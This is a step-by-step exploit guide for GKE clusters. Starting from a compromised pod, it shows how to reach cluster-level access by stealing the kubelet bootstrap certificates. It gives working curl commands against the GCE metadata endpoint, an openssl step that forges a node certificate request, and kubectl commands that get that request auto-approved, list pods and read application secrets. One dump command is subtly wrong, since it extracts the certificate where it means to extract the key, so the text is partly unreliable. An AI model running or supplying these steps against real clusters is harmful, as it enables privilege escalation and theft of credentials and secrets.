### How to get access into a K8s from inside k8s pod using Kubelet TLS Bootstrapping.

Required: You need to be a inside a pod and have kubectl curl installed.

### - How the exploit works.

1. Vulnerable Systems in GKE

- A cluster which has no workload identity and Metadata Concealment configured for k8s cluster
- A cluster with workload identity configured but the pod has hostNetwork: true flag in its spec

2. Description of the expolit

- Bootstrap certs are the main reason this exploit even works. If an attacker gets hold of the bootstrap.crt and bootstrap.key he can list and get CSR objects on k8s cluster which is exploited.
- In GCP there is something called metadata.google.internal endpoint which holds the metadata of the Compute Engine. All VMs in gce can access this endpoint to check the metadata pertaining to it.
- In case of GKE Nodes this endpoint contains a metadata which has all key , value pairs pertaining to GKE cluster eg: ca.cert, K8S api server endpoint etc.
- We will look for one such key value pairs called TPM_BOOTSTRAP_CERT and TPM_BOOTSTRAP_KEY and gain access to list , get and create CSR objects.

### Preparation for the exploit.

- You must have gained an RCE access to a pod inside the vulnerable cluster (By any means). And have kubectl and curl installed.

### The exploit.

- Once you are in the pod which is vulnerable, check if the following endpoint gives some data.

`curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env'`

- If you get some data from the above mentioned endpoint, look for TPM_BOOTSTRAP_CERT , TPM_BOOTSTRAP_KEY and CA_CERT and dump them.

```
curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env' | grep TPM_BOOTSTRAP_CERT | awk '{print $2}' | base64 -d > bootstrap.crt

curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env' | grep TPM_BOOTSTRAP_CERT | awk '{print $2}' | base64 -d > boostrap.key

curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env' | grep CA_CERT | awk '{print $2}' | base64 -d > ca.crt
```

- After dumping these certs , now the real expolits starts. Use the below command to view the CSR objects in the cluster. Also there KUBERNETES_PORT_443_TCP_ADDR is the endpoint of the API server or the masterIP:443

`kubectl --client-certificate bootstrap.crt --client-key boostrap.key --certificate-authority ca.crt --server https://${KUBERNETES_PORT_443_TCP_ADDR} get certificatesigningrequests`

- If you are able to list the csr objects then it is time to create one for yourself and access the cluster using your own certs. [More details on How to access cluster using the certs api is documented here](https://github.com/Vinayaks439/k8s-security-docs/blob/main/docs/CreateUser.MD)

- Create a key and CSR cert by using openssl command.

`openssl req -nodes -newkey rsa:2048 -keyout k8sgg.key -out k8sgg.csr  -subj "/O=system:nodes/CN=system:node:<NAME of the NODE>"`

**Note: Here the CN must be as mentioned above, you have to provide your name of the node where your current pod is running on (Else it wont be auto approved).**

- After you generate a CSR cert. It is time to create a CSR object in k8s cluster from within your pod.

```
cat <<EOF | kubectl --client-certificate bootstrap.crt --client-key boostrap.key --certificate-authority ca.crt --server https://${KUBERNETES_PORT_443_TCP_ADDR} create -f -
apiVersion: certificates.k8s.io/v1
kind: CertificateSigningRequest
metadata:
  name: node-csr-$(date +%s)
spec:
  groups:
  - system:nodes
  request: $(cat k8sgg.csr | base64 | tr -d '\n')
  signerName: kubernetes.io/kube-apiserver-client-kubelet ##If all rules are alinged it will be auto approved.
  expirationSeconds: 86400
  usages:
  - digital signature
  - key encipherment
  - client auth
EOF
```

**Note: The spec.expirationSeconds field was added in Kubernetes v1.22. Earlier versions of Kubernetes do not honor this field. Kubernetes API servers prior to v1.22 will silently drop this field when the object is created.**

- Make sure your object alings well with this documentation which has rules pertaining to your [signerName](https://kubernetes.io/docs/reference/access-authn-authz/certificate-signing-requests/#kubernetes-signers)

- Once your CSR object is auto aprroved and issued, you can fetch your signed public.crt using the following command below.

`kubectl --client-certificate bootstrap.crt --client-key boostrap.key --certificate-authority ca.crt --server https://${KUBERNETES_PORT_443_TCP_ADDR} get csr <CSR_NAME> -o jsonpath='{.status.certificate}' | base64 --decode > node.crt`

- Now finally you have a signed public.crt and a private.key which you generated and is now authenticated to the cluster. You can verify that by using your certs in the kubectl command.

`kubectl --client-certificate node.crt --client-key k8sgg.key --certificate-authority ca.crt --server https://${KUBERNETES_PORT_443_TCP_ADDR} get pods -o wide`

- Voila you just got access to pods by being inside a pod.

- You can use this cert to list secrets and fetch the passwords used by the application inside the cluster.
